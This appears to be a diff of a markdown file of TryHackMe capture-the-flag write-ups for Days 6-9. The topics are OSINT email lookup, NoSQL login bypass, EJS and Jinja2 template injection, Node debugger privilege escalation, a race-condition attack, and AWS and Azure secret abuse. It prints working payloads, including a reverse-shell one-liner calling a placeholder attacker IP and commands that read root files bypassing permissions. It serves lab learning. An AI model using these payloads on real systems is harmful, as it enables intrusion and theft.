@@ -410,107 +410,218 @@ Fix: Store secrets in environment variables with strict permissions or secure co
 
 ---
 
-## Day 6: Complimentary
-* **Category:** Cloud Security / AWS Cognito & DynamoDB
-* **Target System:** AWS Serverless Frontend Application
+## Day 6: Overheard at Breakfast 
+Room Link: TryHackMe - Overheard at Breakfast
+Category: OSINT / Social Media / Email Hashing
+Difficulty: Easy
 
-### Objective
-Extract unauthenticated AWS Cognito Identity Pool IDs from client-side JavaScript assets, obtain temporary STS security credentials, and dump records from DynamoDB.
+📖 Overview & Scenario
+While staying at the Byte Lotus Hotel, a guest overhears a conversation on the breakfast terrace between two individuals: Ponzi (a self-described influencer) and Lambo (someone claiming to have gone off-grid on social media). The guest captures a screenshot of their chat.
 
-### Step-by-Step Execution
+Our goal is to analyze the conversation screenshot, extract key metadata, track down a hidden profile, and retrieve the flag.
 
-1. **Front-End Asset Reconnaissance:**
-   * Open browser developer console (`F12`) on target web app and review `app.js`.
-   * Identify hardcoded AWS configuration parameters:
-     * `IDENTITY_POOL_ID`: `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
-     * `TABLE_NAME`: `complimentary-GuestWellnessProfiles`
+### Step 1: Investigate the screenshot
+When investigating the screen shot, we see that there is an email provided to get us started on our our first step of the investigation.
 
-2. **STS Credential Retrieval via AWS CLI:**
-   * Obtain identity ID:
-     ```bash
-     aws cognito-identity get-id --region us-east-1 --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
-     ```
-   * Fetch temporary access keys:
-     ```bash
-     aws cognito-identity get-credentials-for-identity --identity-id "<IDENTITY_ID>"
-     ```
-   * Export keys into environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`).
+<img width="1043" height="167" alt="vmware_dM6RUYhmU6" src="https://github.com/user-attachments/assets/3d529cc6-0872-4e15-adae-178806265ecb" />
 
-3. **DynamoDB Data Extraction:**
-   * Scan table contents to read sensitive entries:
-     ```bash
-     aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
-     ```
-   * Retrieve embedded flag from output JSON records.
+### Step 2. Email Recon
+In Kali, I used the tool holehe to see if I could find any accounts the user had online that starts with a G.
+
+```Bash
+holehe --only-used lambobytelotushotel@gmail.com
+```
+
+<img width="1056" height="167" alt="vmware_ycEzf7eA2l" src="https://github.com/user-attachments/assets/4e26148b-2e97-4f16-8757-4c4843c55ead" />
+
+And I got a hit for a profile on Gravitar.
+
+### Step 3: Website Recon
+I went to the sight I found using holeho and  I found a profile for Lambdo with a base64 Hash.
+
+<img width="641" height="418" alt="vmware_2s2ocJb4Te" src="https://github.com/user-attachments/assets/f2847dc2-4d39-49b5-80ee-f277b230d38e" />
+
+### Step 4: Cracking The Hash
+I threw the has in a small python script I wrote and I got the flag (I know theirs easier ways to decode base64, but working on learning python).
+
+<img width="884" height="347" alt="vmware_iJ1qGaLG8C" src="https://github.com/user-attachments/assets/9ba18594-f074-454b-93b9-8886221e572d" />
+
+
 
 ---
 
 ## Day 7: Do Not Disturb
-* **Category:** Web Security / NoSQL Injection & SSTI
-* **Target System:** Guest Booking & Preference Portal
+Difficulty: Medium-High (3/5)
+Category: Web, Boot2root, NoSQL Injection, SSTI, Node.js, Debugger Escalation
 
-### Objective
-Bypass login authentication via MongoDB NoSQL operator injection, locate an insecure Jinja2 template rendering field, and execute arbitrary commands via Server-Side Template Injection (SSTI).
+🎯 Task Objectives
+Gain initial access through NoSQL Authentication Bypass.
+Exploit Server-Side Template Injection (SSTI) in Node.js (EJS) to achieve RCE.
+Obtain the User Flag (user.txt).
+Inspect running services and locate the Node Inspector process.
+Escalate privileges via node inspect and filesystem debugging to obtain the Root Flag (root.txt).
 
-### Step-by-Step Execution
+After Starting my lab machine I navigated to website and a presented with a log-in Screen.
 
-1. **NoSQL Authentication Bypass:**
-   * Intercept POST login request using Burp Suite.
-   * Replace explicit string values with MongoDB comparison operators (`$ne`):
-     ```json
-     {
-       "username": {"$ne": null},
-       "password": {"$ne": null}
-     }
-     ```
-   * Gain administrative session access.
+<img width="672" height="577" alt="vmware_tLPZ9Tq3xS" src="https://github.com/user-attachments/assets/ccf11aee-f961-4840-9279-057a4a6e5c75" />
 
-2. **SSTI Identification & Exploitation:**
-   * Locate room preference modification fields rendered dynamically.
-   * Inject test mathematical payload `{{7*7}}` -> observe evaluated output `49`.
-   * Inject RCE command execution payload:
-     ```jinja2
-     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
-     ```
-   * Extract system flag directly from rendered web output.
+### Step 1: Reconnaissance & Enumeration
+I used gobuster to see if I could find any hidden directories and I found /staff. When I tried to access it, I got a response of 403 unauthorized.
+
+### Step 2. Initial Access — NoSQL Injection Bypass
+(this part took me awhile, had do a little research, alot of trial and error until I found out it used MongoDB)
+When accessing /staff directly, the application rejects the request with 403 Unauthorized. We must authenticate as staff first.
+Navigate to the sign-in page on http://<TARGET_IP>/.
+Enter the username attendant with an empty password.
+Intercept the HTTP request using Burp Suite.
+Modify the request headers and body to perform a NoSQL (MongoDB) query injection by bypassing password verification:
+Modified Request:
+
+<img width="1535" height="597" alt="vmware_xtQvA6ZA0f" src="https://github.com/user-attachments/assets/2c75cd00-d9f9-4f4b-9abf-c65ac2d93186" />
+
+Send the modified request. The server returns a 200 OK status and assigns a Staff Cookie.
+Import the session cookie into your browser (or use Open Response in Browser in Burp Suite) and navigate to http://<TARGET_IP>/staff. You should now have access to the staff dashboard.
+
+<img width="583" height="513" alt="vmware_rvj2inz6H3" src="https://github.com/user-attachments/assets/d2d8d3bc-478d-4521-aa5e-47efc263a9bd" />
+
+Phase 3: Exploitation — Server-Side Template Injection (SSTI) to RCE
+Once I learned On the /staff dashboard, there is an input form using the EJS template engine. Since input is processed directly by the renderer, this component is vulnerable to SSTI.
+I decided to try and set up a reverse shell listener on your attack machine using Penelope or Netcat: (I used penelope on this one)
+
+2. Execute RCE via EJS SSTI Payload
+Inject a Node.js child process payload into the template input parameter to spawn a reverse shell back to your VPN IP (<YOUR_IP>):
+
+```Bash
+<%= global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f') %>
+```
+
+3. Capture User Flag
+Once the listener receives the incoming connection, interact with the shell and view user.txt:
+
+<img width="1130" height="408" alt="vmware_8BllQYjfTW" src="https://github.com/user-attachments/assets/55197d68-b1c7-4f77-a382-e458675c4c36" />
+
+###Phase 4: Privilege Escalation — Node Inspector & Raw Disk Access
+1. Internal Service Discovery
+Inspect local system processes and local listening ports on the target machine:
+
+I observeed a process associated with a profile named pipelinesvc (running processor.js) listening locally on 127.0.0.1:9229. Port 9229 is the default debugging port for Node.js (node --inspect).
+
+2. Connect to the Node Debugger
+Connected to the Node Debugger
+ I ran node inspect 127.0.0.1:9229 to attach the Node CLI debugger to a service listening locally on port 9229. Running repl dropped you into an interactive Read-Eval-Print Loop context where you could evaluate arbitrary Node.js code inside that process.
+
+Enumerated Raw Storage Devices
+Inside the REPL, I imported child_process and ran execSync with an ls -l command targeting common storage paths (/dev/sd*, /dev/vd*, /dev/nvme*, /dev/mapper/*). This revealed available system disk devices, specifically pointing to the NVMe raw partitions (/dev/nvme0n1p1).
+
+Listed the /root Directory via debugfs
+Using execFileSync, I ran /usr/sbin/debugfs with the -R 'ls /root' argument directly against the partition /dev/nvme0n1p1. This allowed me to view the file contents of the root home directory by directly reading the ext4 file system metadata, completely bypassing standard Linux OS file permission checks. This is when I saw root.txt listed.
+
+Extracted the Flag
+Finally, I executed debugfs again with -R 'cat /root/root.txt' against /dev/nvme0n1p1 with UTF-8 encoding. This dumped the raw contents of the flag directly from the disk blocks into the terminal output.
+
+<img width="1146" height="435" alt="vmware_n8RTRWWWcS" src="https://github.com/user-attachments/assets/b0607df6-fed1-4399-a8c2-13e6d7e49f3d" />
+
+
 
 ---
 
-## Day 8: The Brochure
-* **Category:** Web Security / Server-Side Request Forgery (SSRF)
-* **Target System:** PDF Pamphlet & Brochure Generator
+## Day 8: # Towel on the Sunbed
 
-### Objective
-Leverage an internal PDF conversion engine to execute Server-Side Request Forgery (SSRF), bypass perimeter restrictions, and exfiltrate internal system files/endpoints.
+* **Category:** Web Application Security
+* **Vulnerability Type:** Race Condition (Limit Overrun / Concurrency Control Flaw)
+* **Tools Used:** 
+  * Web Browser
+  * Burp Suite Professional / Community (Repeater Parallel Grouping)
 
-### Step-by-Step Execution
+---
 
-1. **SSRF Entry Point Testing:**
-   * Access brochure generator input field accepting remote HTML/URL inputs to render into PDF format.
-   * Supply local loopback address (`http://127.0.0.1:80`) to confirm local request processing.
+## 🔍 Walkthrough & Exploitation
 
-2. **Internal Reconnaissance & Local File Access:**
-   * Test internal administrative endpoints (`http://127.0.0.1:8080/admin`) or URI schemas (`file:///etc/flag.txt` / `file:///app/flag.txt`).
+### Step 1: Account Registration & Initial Observation
 
-3. **Exfiltration & PDF Parsing:**
-   * Generate PDF document and download file.
-   * Open converted document to inspect rendered internal file contents and extract flag text.
+1. Navigate to the web application target IP in your browser.
+2. Click **Register** to create a new user account.
+3. Log in with the newly created credentials to access the user dashboard.
 
+---
+
+### Step 2: Analyzing Application Logic
+
+1. Upon logging in, locate the **Claim Reward** function.
+2. Click **Claim Reward** once. You will successfully receive your initial allocation of "ponzi" points.
+3. Attempting to click **Claim Reward** a second time triggers a 24-hour timer restriction.
+4. Check the **Vault** requirements — unlocking it requires **150 ponzi**.
+
+<img width="731" height="347" alt="vmware_jULDv07l5V" src="https://github.com/user-attachments/assets/54b559ff-74dd-4eb4-aaf1-34c2f7d8e4e8" />
+
+---
+
+### Step 3: Vulnerability Analysis
+
+1. Intercept the `POST /claim` (or relevant reward claim endpoint) request in **Burp Suite** and send it to **Repeater**.
+2. Resending the request individually yields an error indicating that the timer is actively blocking the request.
+3. **Flaw:** The server validates the cooldown state, updates the points, and updates the timestamp without enforcing mutex/locking locks or atomic database operations. This opens a window for a **Single-Packet / Parallel Race Condition Attack**.
+
+<img width="365" height="98" alt="vmware_Xuvkactdtf" src="https://github.com/user-attachments/assets/c6c1a96c-ee0c-4eb1-b4b5-77c59839cab0" />
+
+---
+
+### Step 4: Exploiting the Race Condition
+
+To ensure clean state execution:
+
+1. Register a fresh account (or clear state) and obtain a brand-new session cookie (`connect.sid`).
+2. Intercept a fresh reward request in Burp Suite and capture the `connect.sid` value.
+3. In **Burp Repeater**:
+   * Create a **New Request Group**.
+   * Add the captured reward claim request into the group.
+   * Duplicate the request tab **~99 times** inside the same group.
+   * Update all duplicated tabs with the fresh `connect.sid` session token.
+4. Set the execution mode on the group tab dropdown to:
+   * **`Send group in parallel (last-byte sync)`**
+5. Click **Send Group**.
+
+<img width="779" height="537" alt="vmware_4yI2G3fCBj" src="https://github.com/user-attachments/assets/1b3a1231-f4ee-402c-a8aa-718f97ee4d5e" />
+
+---
+
+### Step 5: Post-Exploitation & Flag Retrieval
+
+1. Observe the response codes across all tabs in the group — the parallel execution forces all requests through the validation window prior to the cooldown timestamp update.
+2. Return to the browser and refresh the application dashboard.
+3. The total accumulated balance will exceed **150 ponzi**.
+4. Navigate to the **Vault**, click **Open Vault**, and retrieve the flag!
+
+<img width="409" height="136" alt="vmware_Z8isODACLG" src="https://github.com/user-attachments/assets/4f1d944d-bbe1-424b-ae85-e2ddb9808a5d" />
+
+<img width="726" height="246" alt="vmware_Vis5CE7E4g" src="https://github.com/user-attachments/assets/02842d47-0ee2-472b-8b8d-e77943e988a6" />
+
+### Remediation & Mitigations
+To patch this race condition:
+Atomic Operations & Mutexes: Enforce strict session/user locking or handle balance/cooldown operations inside an atomic database transaction.
+Database Level Constraints: Implement unique transaction constraints or row-level locking (SELECT ... FOR UPDATE) before checking or modifying the timestamp/balance.
+Rate Limiting & Queueing: Queue incoming reward claims per user ID sequentially rather than handling them asynchronously across multiple concurrent worker threads.
 ---
 
 ## Day 9: CryptoCabana
 * **Category:** Cloud Security / Azure Storage & Key Vault
 * **Target System:** Crypto Kiosk Azure Cloud Infrastructure
 
-### Objective
-Locate exposed Azure Storage SAS tokens inside client-side JS bundles, enumerate storage containers, extract Service Principal secrets, and audit historical secret versions within Azure Key Vault.
-
 ### Step-by-Step Execution
+### Step 1: Initial Reconnaissance & Client-Side Source Inspection
 
-1. **Client-Side Secret Extraction:**
-   * Browse `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`.
-   * Open DevTools (`F12`), review `app.js`, and isolate hardcoded Azure Blob Storage SAS token.
+1. Navigate to the target web application hosted on Azure Blob Static Storage:
+   [https://cryptocabanaf5scjagc.z13.web.core.windows.net/](https://cryptocabanaf5scjagc.z13.web.core.windows.net/)
 
+After inspecting the source code I see, app.js and Inspected that further.
+Key Finding: The client-side code contains hardcoded credentials or a Shared Access Signature (SAS) token / connection string allowing direct API calls to Azure Storage blobs.
+
+<img width="1211" height="64" alt="vmware_TClvlz5aUs" src="https://github.com/user-attachments/assets/94fed7b3-ae77-4b6a-bf6d-63169486825c" />
+
+
+
+
+   
 2. **Azure Storage Enumeration & Artifact Download:**
    * List container files via Azure CLI:
      ```bash
